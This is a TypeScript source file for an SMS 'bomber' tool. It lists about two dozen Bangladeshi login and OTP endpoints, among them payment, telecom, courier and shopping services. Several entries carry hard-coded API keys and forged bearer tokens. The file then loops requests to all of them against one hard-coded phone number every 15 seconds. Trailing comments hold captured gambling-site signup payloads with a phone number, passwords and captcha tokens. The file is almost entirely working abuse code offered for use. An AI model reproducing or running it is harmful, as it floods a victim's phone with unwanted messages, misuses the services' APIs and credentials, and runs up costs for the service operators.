import axios from "axios"
import { CreateFormDataFromObject } from "./res/createFormData"
import { CreateRandomNumberString, CreateRandomString } from "./res/createRandomString"
import { RequestObject } from "./types"


/**
 * Creates an array of the request objects
 * @param {number} phone Phone number as 1790137029
 * @returns Array<RequestObject>
 */
const CreateRequestArray = (phone: string): Array<RequestObject> => {
    const arr: Array<RequestObject> = [
        {
            method: "POST",
            url: "https://portal.flipper.com.bd/api/v1/send-otp/login",
            data: {
                "mobile_number": `0${phone}`
            },
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "X-Authorization": "QoFN68MGTcosJxSmDf5GCgxXlNcgE1mUH9MUWuDHgs7dugjR7P2ziASzpo3frHL3"
            },
            ServiceName: "Flipper",
            
        }, {
            method: "POST",
            url: "https://api.busbd.com.bd/api/auth",
            data: {
                "phone": `+880${phone}`
            },
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
            },
            ServiceName: "BusBD",
        }, {
            method: "POST",
            url: "https://auth.qcoom.com/api/v1/otp/send",
            data: {
                "mobileNumber": `+880${phone}`
            },
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
            },
            ServiceName: "QCoom",
        }, {
            method: "POST",
            url: "https://www.shopz.com.bd/wp-admin/admin-ajax.php",
            data: CreateFormDataFromObject({
                "g-web-reg-phone-cc": "+88",
                "g-web-reg-phone": `0${phone}`,
                "g-web-form-token": "1614",
                "g-web-csrf": "580a856",
                "g-web-form-type": "register_user",
                "email": `0${phone}@www.shopz.com.bd`,
                "password": "Rs#mbkM#2D$VrUJ",
                "woocommerce-register-nonce": "e56573c6ed",
                "action": "g_web_phone_register_form_submit",
            }),
            headers: {
                "Accept": "application/json",
                "Content-Type": "multipart/form-data",
            },
            ServiceName: "Shopz",
        },{
            method: "GET",
            url: `https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=0${phone}`,
            headers: {
                "Accept": "*/*",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            },
            ServiceName: "Bikroy",
        }, {
            method: "POST",
            url: "https://meenabazardev.com/api/front/send/otp",
            data: {
                "CellPhone": `0${phone}`,
                "type": "login"
            },
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
            },
            ServiceName: "MeenaBazar",
        }, {
            method: "GET",
            url: `https://cms.beta.praavahealth.com/api/v2/user/login/?mobile=0${phone}`,
            headers: {
                "Accept": "application/json",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            },
            ServiceName: "PraavaHealth",
        }, {
            method: "POST",
            url: "https://api.swap.com.bd/api/v1/send-otp/v2",
            data: {
                "phone": `0${phone}`,
            },
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
            },
            ServiceName: "SwapBD",
        }, {
            method: "POST",
            url: `https://www.rokomari.com/otp/send?emailOrPhone=880${phone}&countryCode=BD`,
            headers: {
                "Accept": "*/*",
                "Token": "45601f3d391886fcec5f5a3f26780f21",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            },
            ServiceName: "Rokomari",
        }, {
            method: "GET",
            url: `https://chinaonlinebd.com/api/login/getOtp?phone=0${phone}`,
            headers: {
                "Accept": "*/*",
                "Token": "45601f3d391886fcec5f5a3f26780f21",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            },
            ServiceName: "China Online",
        }, {
            method: "POST",
            url: "https://core.shoplover.com/sll/auth/otp-login",
            data: {
                "phone": `+880${phone}`,
                "type": 1,
            },
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
            },
            ServiceName: "ShopLover",
        }, {
            method: "POST",
            url: "https://api.ekshop.gov.bd:3001/api/initotp",
            data: {
                "phone_number": phone,
                "country_code": "+880",
                "phone": phone
            },
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
            },
            ServiceName: "Ekshop",
        }, {
            method: "POST",
            url: "https://www.lazzpharma.com/MessagingArea/OtpMessage/WebRegister",
            data: {
                "Phone": `0${phone}`,
                "ActivityId": "32d84197-8d99-4823-bc09-767631cf18fe",
            },
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
            },
            ServiceName: "Lazz Pharma",
        }, {
            method: "POST",
            url: "https://api.betonbook.com/api/v5/auth/otp/request",
            data: {
                "phone": `0${phone}`,
                "language": 1,
            },
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
            },
            ServiceName: "BetonBook",
        }, {
            method: "POST",
            url: "https://webapi.robi.com.bd/v1/account/register/otp",
            data: {
                "phone_number": `0${phone}`,
            },
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": `Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTcwNDQ1NTUwMSwibmJmIjoxNzA0NDU1NTAxLCJleHAiOjE3MDQ0NTkxMDEsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.L6OLopsMekPTd3${CreateRandomString(20)}`
            },
            ServiceName: "Robi",
        }, {
            method: "POST",
            url: "https://api-gateway.sundarbancourierltd.com/graphql",
            data: {
                "operationName": "CreateAccessToken",
                "variables": {
                    "accessTokenFilter":{
                        "userName":`0${phone}`,
                    }
                },
                "query": "mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) {\n  createAccessToken(accessTokenFilter: $accessTokenFilter) {\n    message\n    statusCode\n    result {\n      phone\n      otpCounter\n      __typename\n    }\n    __typename\n  }\n}",
            },
            headers: {
                "Accept": "*/*",
                "Content-Type": "application/json",
                "Authorization": `Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTcwNDQ1NTUwMSwibmJmIjoxNzA0NDU1NTAxLCJleHAiOjE3MDQ0NTkxMDEsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.L6OLopsMekPTd3${CreateRandomString(20)}`
            },
            ServiceName: "Sundarban Courier",
        }, {
            method: "POST",
            url: "https://api.redx.com.bd/v1/user/signup",
            data: {
                "name": phone,
                "phoneNumber": phone,
                "service":"redx",
            },
            headers: {
                "Accept": "*/*",
                "Content-Type": "application/json",
            },
            ServiceName: "RedX",
        }, {
            method: "POST",
            url: "https://coreapi.deliverytiger.com.bd/api/OTP/SendOtpProcess",
            data: {
                "RequestFrom": "Web",
                "FlagType": 1,
                "MobileNumber": `0${phone}`,
                "EmailAddress": null
            },
            headers: {
                "Accept": "*/*",
                "Content-Type": "application/json",
                "X-Api-Key": "e5a54c50-8461-442d-b18e-873aff623ee0"
            },
            ServiceName: "DeliveryTiger",
        }, {
            method: "GET",
            url: `https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile=0${phone}`,
            headers: {
                "Accept": "*/*",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            },
            ServiceName: "ECourier",
        }, {
            method: "POST",
            url: "https://accountkit.sheba.xyz/api/shoot-otp",
            data: {
                "mobile": `+880${phone}`,
                "app_id": "8329815A6D1AE6DD",
                "api_token": "54LOvQ5Zk9r4RTUil8LHKYyD7Jx6fFyIr2F2Tc4oQ7XpUJFj46rCZUc74zbm"
            },
            headers: {
                "Accept": "*/*",
                "Content-Type": "application/json",
                "X-Api-Key": "e5a54c50-8461-442d-b18e-873aff623ee0"
            },
            ServiceName: "Sheba",
        }, {
            method: "POST",
            url: "https://api.bdtickets.com:20100/v1/auth",
            data: {
                "createUserCheck": true,
                "phoneNumber": `+880${phone}`,
                "applicationChannel": "WEB_APP"
            },
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "X-Api-Key": "e5a54c50-8461-442d-b18e-873aff623ee0"
            },
            ServiceName: "BDTickets",
        }, {
            method: "POST",
            url: "https://tc-customer-ui-backend.pgw-tc.pay.bka.sh/wallet/validate",
            data: {
                "wallet": `+880${phone}`,
                "paymentId": "TR0011wIyvzPy1704457611468",
                "apiVersion": "v1.2.0-beta",
                "resendOtp": true
            },
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
            },
            ServiceName: "BKash",
        }, {
            method: "POST",
            url: "https://api.runcash.co/runcash/register/app/sendSms",
            data: {
                "appsFlyerId":"1692938311415-1726537934558822510",
                "pkg_name":"com.mengjiala.runcash",
                "referrer":"utm_source=google-play&utm_medium=organic",
                "app_version":"1.0.3",
                phone: `0${phone}`,
                "channel":"1",
                "sign":"95fd15f15b37cfac41635e2b1fd2897b",
                "imei":"",
                "appversion":"1.0.3",
                "type":"2",
                "version":"1.0.3",
                "timestamp":"1692938376659"
            },
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
            },
            ServiceName: "Runcash",
        }, {
            method: "POST",
            url: "https://developer.quizgiri.xyz/api/v2.0/send-otp",
            data: {
                "phone": `0${phone}`,
                "country_code":"+880",
                "fcm_token":null
            },
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
            },
            ServiceName: "Quizgiri",
        },

    ]
    return arr;
}



let count = 0;

const StartBombing = (phone, index) => {
    const arr = CreateRequestArray(phone)
    if(index >= arr.length){
        return setTimeout(() => {
            StartBombing(phone, 0)
        }, 15000)
    }
    axios(arr[index]).then(d => {
        count++
        console.log(`${count}  ✓  ${arr[index].ServiceName}\n`)
        //return StartBombing(phone, (index + 1))
    }).catch(err => {
        console.log(`${count}  ❌  ${arr[index].ServiceName}\n`)
        //return StartBombing(phone, (index + 1))
    })
    return StartBombing(phone, (index + 1))
}


console.log(`${CreateRequestArray("1828004055").length} APIs Found`)

const phone = "1828004055"
StartBombing(phone, 0)



/*
https://clientsapi11.ibbf55-resources.com/uni/registration/createProcess
{"phoneNumber":"+8801790137028","password":"123456789@ss","promocode":"","marketingOffersAccepted":true,"countryISO":"BD","checkBoxes":[{"kind":"PersonalDataProcessing","checked":true}],"currencyId":31,"captcha":{"kind":"CFTurnstile","siteKey":"0x4AAAAAAAPt28UgSd7Ubn3e","token":"0.cq7aJgGe7tA4FGlmE8fkvcMu9CK8lnAWz_i88CEazCCQVosrPAw2ZxcIpjC5l0MPmMHGeFCCTzkVPmdOxWIVFA6CUUidbbBT07lqy5SCcorrwRNT2g8ee0POld9Pm1jl-e9Cqk7V7Vd1gVOV0wKqy73DDgixlbgJId_iEKR-MpqAsToDVF0xn7RxRA5_InIKWVDDzMtfA1WnMRKfPyZivrQqqJ4yRG5QLHzx_liyE22BvuHlLoyVtPJ5_fpdLLcmHATVcKGhBoOYr9etypG5e_NB-D2THDp4NMjYTNL86e101ec1BA_95KsSMlmd6mXjPUABP6kVpqjNbHhzuYWWFDwilTSmkGZ0rMxb3m8iVQqeDVVdTTzMckp4YBmwxzmDpvC9a_ZRenKtBNrGtP8lkqRdWKsK036HQe8gKNqw-xrogUsd8gTMDhTRyOEOebo0.CWKcxZJ4sVSoHwmICpWY9w.19d16855ea5e8eb8a0ccd578f8e9a40872b9566c5fe141749f52e22e355b2503"},"advertInfo":"?affijet-click=udc68da14a1864befb1d1be8fc2d4da3b&partner_id=6725&utm_medium=Affiliate&sub_1=bettingonlinebd.net_FlatFee&sub_2=20240210-1938-0945-b691-32ca31868f6a","webReferrer":"https://baterybet.in/promo/top_match_reg/?affijet-click=udc68da14a1864befb1d1be8fc2d4da3b&partner_id=6725&utm_medium=Affiliate&sub_1=bettingonlinebd.net_FlatFee&sub_2=20240210-1938-0945-b691-32ca31868f6a&__cf_chl_tk=vLKQo0paUG4nhHGzu4jIJHZ20GYAgweMwKGc7PXrak8-1707593896-0-4816","sysId":15,"lang":"en","appVersion":"1.11.5","deviceId":"0853768F06FE16FE5AE654D9014D2AE4"}
*/

/*
https://pm-77win.com/api/v3/registration/byform
{"phone":"+8801790137028","password":"ruMAjqNdW8gV3fF","defaultCurrency":"BDT","isPlayerAgree":true,"isBonusActivated":true,"bonusProductType":"sport","formName":"SHORTREGISTRATIONBYPHONE","selectedLanguage":"bn","nnBonus":"1","marketingMeta":{"mlv":"v0.6.2","sourceURL":"https://www.bettingonlinebd.net/","registerURL":"https://pm-77win.com/bn/choose-reg/regtel/1?qtag=a12902_t61283080_c1293_s20240210-1939-5788-bea5-6d7f5e710bf3_bettingonlinebd_crossbrand_BD&redirect_creative_id=1293&x_pm_click=65d3bc5dd2546059c08a3970a0edf3c8","x_pm_click":"65d3bc5dd2546059c08a3970a0edf3c8","dhash":"6c48646d-06de-4a87-b7c1-92f4c078d052","entrance_url":"https://pm-77win.com/choose-reg/regmail/1?qtag=a12902_t61283080_c1293_s20240210-1939-5788-bea5-6d7f5e710bf3_bettingonlinebd_crossbrand_BD&x_pm_click=65d3bc5dd2546059c08a3970a0edf3c8&redirect_creative_id=1293","qtag":"a12902_t61283080_c1293_s20240210-1939-5788-bea5-6d7f5e710bf3_bettingonlinebd_crossbrand_BD","qtag_t":"1707594006243","win_tag":"a12902_t61283080_c1293_s20240210-1939-5788-bea5-6d7f5e710bf3_bettingonlinebd_crossbrand_BD","win_tag_type":"qtag","wtl":"aw"}}
*/


/*
{"membercode":"assssaasaas","password":"x4EBezzCnN","currency":"BDT","email":null,"registration_site":"desktop","mobile":"1790137028","line":"","referral_code":null,"is_early_bird":"0","domain":"https://www.bd1nagad88.xyz","language":"en","verification_code":"","reg_type":2,"agent_team":"AG000005","utm_source":null,"utm_medium":null,"utm_campaign":null,"s2":null,"fp":"3ee3e1965647220f5a7b868a731e4f7d","pid":null,"c_id":null}
*/